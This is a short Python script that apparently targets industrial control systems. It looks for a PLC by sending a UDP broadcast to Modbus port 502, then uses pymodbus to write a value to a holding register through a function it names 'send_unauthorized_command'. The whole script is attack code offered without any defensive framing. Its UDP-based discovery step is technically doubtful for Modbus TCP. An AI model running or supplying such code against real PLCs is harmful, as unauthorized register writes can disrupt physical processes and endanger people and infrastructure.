import socket
import struct
import time
from pymodbus.client import ModbusTcpClient

# Function to discover the PLC's IP address
def discover_plc_ip():
    # Define the broadcast address and port
    broadcast_address = '255.255.255.255'
    port = 502  # Modbus TCP port

    # Create a UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

    # Send a broadcast message to discover the PLC
    discovery_message = b'\x00\x01\x00\x00\x00\x06\x01\x02\x00\x00\x00\x01'
    sock.sendto(discovery_message, (broadcast_address, port))

    # Receive the response
    sock.settimeout(5)
    try:
        data, addr = sock.recvfrom(1024)
        print(f"PLC found at IP address: {addr[0]}")
        return addr[0]
    except socket.timeout:
        print("No PLC found. Please check the network configuration.")
        return None

# Function to send an unauthorized command to the PLC
def send_unauthorized_command(plc_ip):
    # Create a Modbus TCP client
    client = ModbusTcpClient(plc_ip)

    # Connect to the PLC
    if not client.connect():
        print("Failed to connect to the PLC.")
        return

    try:
        # Example: Write a value to a specific register (e.g., register 0x0001)
        register_address = 0x0001
        value_to_write = 0x01  # Example value to write

        # Send the command
        result = client.write_register(register_address, value_to_write)

        if result.isError():
            print("Failed to send the command.")
        else:
            print("Command sent successfully.")
    finally:
        # Close the connection
        client.close()

# Main function
def main():
    # Discover the PLC's IP address
    plc_ip = discover_plc_ip()
    if plc_ip:
        # Send an unauthorized command to the PLC
        send_unauthorized_command(plc_ip)

if __name__ == "__main__":
    main()